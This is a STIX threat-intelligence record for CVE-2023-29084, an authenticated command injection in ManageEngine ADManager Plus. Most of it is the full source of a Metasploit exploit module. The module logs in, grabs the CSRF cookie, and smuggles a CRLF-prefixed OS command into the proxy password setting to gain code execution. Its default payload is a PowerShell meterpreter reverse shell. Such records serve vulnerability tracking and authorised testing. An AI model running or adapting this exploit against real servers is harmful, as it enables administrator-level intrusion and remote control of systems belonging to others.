{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6cdfab67-eb39-45f1-85c6-b06707c72f11",
    "created": "2024-08-14T16:54:29.856382Z",
    "modified": "2024-08-14T16:54:29.856386Z",
    "name": "ManageEngine ADManager Plus ChangePasswordAction Authenticated Command Injection",
    "description": " ManageEngine ADManager Plus prior to build 7181 is vulnerable to an authenticated command injection due to insufficient validation of user input when performing the ChangePasswordAction function before passing it into a string that is later used as an OS command to execute.  By making a POST request to /api/json/admin/saveServerSettings with a params POST parameter containing a JSON array object that has a USERNAME or PASSWORD element containing a carriage return and newline, followed by the command the attacker wishes to execute, an attacker can gain RCE as the user running ADManager Plus, which will typically be the local administrator.  Note that the attacker must be authenticated in order to send requests to /api/json/admin/saveServerSettings so this vulnerability does require authentication to exploit.  As this exploit modifies the HTTP proxy settings for the entire server, one cannot use fetch payloads with this exploit, since these will use HTTP connections that will be affected by the change in configuration. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/manageengine_admanager_plus_cve_2023_29084_auth_cmd_injection.rb",
            "external_id": "manageengine_admanager_plus_cve_2023_29084_auth_cmd_injection.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-29084"
        },
        {
            "source_name": "reference",
            "url": "https://www.manageengine.com/products/ad-manager/release-notes.html#ReleaseNotesandReporterAcknowledgement"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  require 'json'\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'ManageEngine ADManager Plus ChangePasswordAction Authenticated Command Injection',\n        'Description' => %q{\n          ManageEngine ADManager Plus prior to build 7181 is vulnerable to an authenticated command injection due to insufficient\n          validation of user input when performing the ChangePasswordAction function before passing it into a string that is later\n          used as an OS command to execute.\n\n          By making a POST request to /api/json/admin/saveServerSettings with a params POST\n          parameter containing a JSON array object that has a USERNAME or PASSWORD element containing a\n          carriage return and newline, followed by the command the attacker wishes to execute, an attacker can gain RCE as the user\n          running ADManager Plus, which will typically be the local administrator.\n\n          Note that the attacker must be authenticated in order to send requests to /api/json/admin/saveServerSettings,\n          so this vulnerability does require authentication to exploit.\n\n          As this exploit modifies the HTTP proxy settings for the entire server, one cannot use fetch payloads\n          with this exploit, since these will use HTTP connections that will be affected by the change in configuration.\n        },\n        'Author' => [\n          'Simon Humbert', # Disclosure of bug via ZDI\n          'Dinh Hoang', # Aka hnd3884. Writeup and PoC\n          'Grant Willcox', # Metasploit module\n        ],\n        'References' => [\n          ['CVE', '2023-29084'],\n          ['URL', 'https://hnd3884.github.io/posts/CVE-2023-29084-Command-injection-in-ManageEngine-ADManager-plus/'], # Writeup\n          ['URL', 'https://www.zerodayinitiative.com/advisories/ZDI-23-438/'], # ZDI Advisory\n          ['URL', 'https://www.manageengine.com/products/ad-manager/admanager-kb/cve-2023-29084.html'], # Advisory\n          ['URL', 'https://www.manageengine.com/products/ad-manager/release-notes.html'] # Release Notes and Reporter Acknowledgement\n        ],\n        'DisclosureDate' => '2023-04-12',\n        'License' => MSF_LICENSE,\n        'Platform' => 'win',\n        'Arch' => [ARCH_CMD],\n        'Privileged' => true,\n        'Payload' => {\n          'BadChars' => \"\\x22\\x0A\\x0D\\x00[{}]:,\" # Avoid double quotes, aka 0x22, and some other characters that might cause issues.\n        },\n        'Targets' => [\n          [\n            'Windows Command',\n            {\n              'Arch' => ARCH_CMD,\n              'Type' => :win_cmd,\n              'DefaultOptions' => { 'PAYLOAD' => 'cmd/windows/powershell/meterpreter/reverse_tcp' },\n              'Payload' => { 'Compat' => { 'ConnectionType' => 'reverse bind none' } }\n            }\n          ],\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'RPORT' => 8080\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES] # We are changing the proxy settings for every HTTP connection on the target server.\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('USERNAME', [true, 'The user to log into ADManager Plus as', 'admin']),\n        OptString.new('PASSWORD', [true, 'The password to log in with', 'admin']),\n        OptString.new('DOMAIN', [true, 'The domain to log into', 'ADManager Plus Authentication'])\n      ]\n    )\n  end\n\n  def login(username, password, domain)\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'j_security_check'),\n      'method' => 'POST',\n      'vars_get' => {\n        'LogoutFromSSO' => 'true'\n      },\n      'vars_post' => {\n        'is_admp_pass_encrypted' => 'false', # Optional but better to keep it in here to match normal request.\n        'j_username' => username,\n        'j_password' => password,\n        'domainName' => domain,\n        'AUTHRULE_NAME' => 'ADAuthenticator'\n      },\n      'keep_cookies' => true\n    )\n\n    unless res && (res.code == 302 || res.code == 303)\n      fail_with(Failure::NoAccess, 'Could not log in successfully!')\n    end\n\n    print_good('Logged in successfully!')\n  end\n\n  def check\n    res = send_request_cgi(\n      'uri' => target_uri.path,\n      'method' => 'GET'\n    )\n\n    unless res && res.code == 200 && res.body\n      return CheckCode::Unknown('Browsing to root of website returned a non-200 or empty response!')\n    end\n\n    unless res.body&.match(/\\.val\\('ADManager Plus Authentication'\\)/)\n      return CheckCode::Safe('Target is not running ADManager Plus!')\n    end\n\n    build_number = res.body&.match(/src=\".+\\.js\\?v=(\\d{4})\"/)\n    unless build_number\n      return CheckCode::Unknown('Home page did not leak the build number via the ?v= parameter as expected!')\n    end\n\n    build_number = build_number[1]\n    print_good(\"The target is running AdManager Plus build #{build_number}!\")\n\n    # Versions 7181 and later are patched, everything prior is vulnerable.\n    target_build = Rex::Version.new(build_number)\n    if target_build >= Rex::Version.new('7181')\n      CheckCode::Safe('Target is running a patched version of AdManager Plus!')\n    elsif target_build < Rex::Version.new('7181')\n      CheckCode::Appears('Target appears to be running a vulnerable version of AdManager Plus!')\n    else\n      CheckCode::Unknown(\"An unknown error occurred when trying to parse the build number: #{build_number}. Please report this error!\")\n    end\n  end\n\n  def exploit\n    res = send_request_cgi(\n      'uri' => target_uri.path,\n      'method' => 'GET',\n      'keep_cookies' => true\n    )\n\n    unless res && res.code == 200\n      fail_with(Failure::UnexpectedReply, 'Home page of target did not respond with the expected 200 OK code!')\n    end\n\n    login(datastore['USERNAME'], datastore['PASSWORD'], datastore['DOMAIN'])\n\n    # We need to do this post login otherwise we will get errors. This also ensures we get updated\n    # cookies post login as these can sometimes change post login process.\n    res = send_request_cgi(\n      'uri' => target_uri.path,\n      'method' => 'GET',\n      'keep_cookies' => true\n    )\n\n    unless res && res.code == 200\n      fail_with(Failure::UnexpectedReply, 'Home page of target did not respond with the expected 200 OK code post authentication!')\n    end\n\n    # Check that we actually got our cookies updated post authentication and visiting the homepage.\n    unless res&.get_cookies&.match(/adscsrf=.*?;.*?;.*?_zcsr_tmp=.*?;/)\n      fail_with(Failure::UnexpectedReply, 'Target did not respond with the expected updated cookies after logging in and visiting the home page.')\n    end\n\n    @csrf_cookie = nil\n    for cookie in @cookie_jar&.cookies\n      if cookie.name == 'adscsrf'\n        @csrf_cookie = cookie.value\n        break\n      end\n    end\n\n    fail_with(Failure::NoAccess, 'Could not obtain adscrf cookie!') if @csrf_cookie.blank?\n\n    retrieve_original_settings\n\n    begin\n      modify_proxy(create_params_value_enable(payload.encoded))\n    ensure\n      modify_proxy(create_params_value_restore)\n    end\n  end\n\n  def retrieve_original_settings\n    res = send_request_cgi(\n      {\n        'uri' => normalize_uri(target_uri.path, 'api', 'json', 'admin', 'getServerSettings'),\n        'method' => 'POST',\n        'vars_post' => {\n          'adscsrf' => @csrf_cookie\n        },\n        'keep_cookies' => true\n      }\n    )\n\n    unless res && res.code == 200 && res&.body&.match(/ads_admin_notifications/)\n      fail_with(Failure::UnexpectedReply, 'Was unable to get the admin settings for restoration!')\n    end\n\n    json_body = JSON.parse(res.body)\n    server_details = json_body['serverDetails']\n    unless server_details\n      fail_with(Failure::UnexpectedReply, 'Was unable to retrieve the server settings!')\n    end\n\n    server_details.each do |elm|\n      next unless elm['tabId'] == 'proxy'\n\n      @original_port = elm['PORT']\n      @original_password = elm['PASSWORD']\n      @proxy_enabled = elm['ENABLE_PROXY']\n      @original_server_name = elm['SERVER_NAME']\n      @original_user_name = elm['USER_NAME']\n      break\n    end\n  end\n\n  def modify_proxy(params)\n    res = send_request_cgi(\n      {\n        'uri' => normalize_uri(target_uri.path, 'api', 'json', 'admin', 'saveServerSettings'),\n        'method' => 'POST',\n        'vars_post' => {\n          'adscsrf' => @csrf_cookie,\n          'params' => params\n        },\n        'keep_cookies' => true\n      }\n    )\n\n    if res && res.code == 200\n      if res.body&.match(/{\"isAuthorized\":false}/)\n        fail_with(Failure::NoAccess, 'Somehow we became unauthenticated during exploitation!')\n      elsif res.body&.match(/Successfully updated the following settings.*-.*Proxy Settings/)\n        print_warning(\"Settings successfully changed confirmation received before timeout occurred. Its possible the payload didn't execute!\")\n      elsif res.body&.match(/\"status\":\"error\"/)\n        print_error(\"The payload somehow triggered an error on the target's side! Error was: #{res.body}\")\n      else\n        fail_with(Failure::PayloadFailed, 'Was not able to successfully update the settings to execute the payload!')\n      end\n    elsif res.nil?\n      print_good('Request timed out. Its likely the payload executed successfully!')\n    else\n      fail_with(Failure::UnexpectedReply, \"Target responded with a non-200 OK code to our saveServerSettings request! Code was #{res.code}\")\n    end\n  end\n\n  def create_params_value_enable(cmd)\n    [\n      {\n        tabId: 'proxy',\n        ENABLE_PROXY: true,\n        SERVER_NAME: 'localhost', # In my experience this worked most reliably.\n        USER_NAME: Rex::Text.rand_text_alphanumeric(4..20).to_s,\n        PASSWORD: \"#{Rex::Text.rand_text_alphanumeric(4..20)}\\r\\n#{cmd}\",\n        PORT: datastore['RPORT'] # In my experience, setting this to the same PORT as the web server worked reliably.\n      }\n    ].to_json\n  end\n\n  def create_params_value_restore\n    [\n      {\n        tabId: 'proxy',\n        ENABLE_PROXY: @proxy_enabled,\n        SERVER_NAME: @original_server_name,\n        USER_NAME: @original_user_name,\n        PASSWORD: @original_password,\n        PORT: @original_port\n      }\n    ].to_json\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-04-12",
    "x_mitre_platforms": [
        "win'"
    ]
}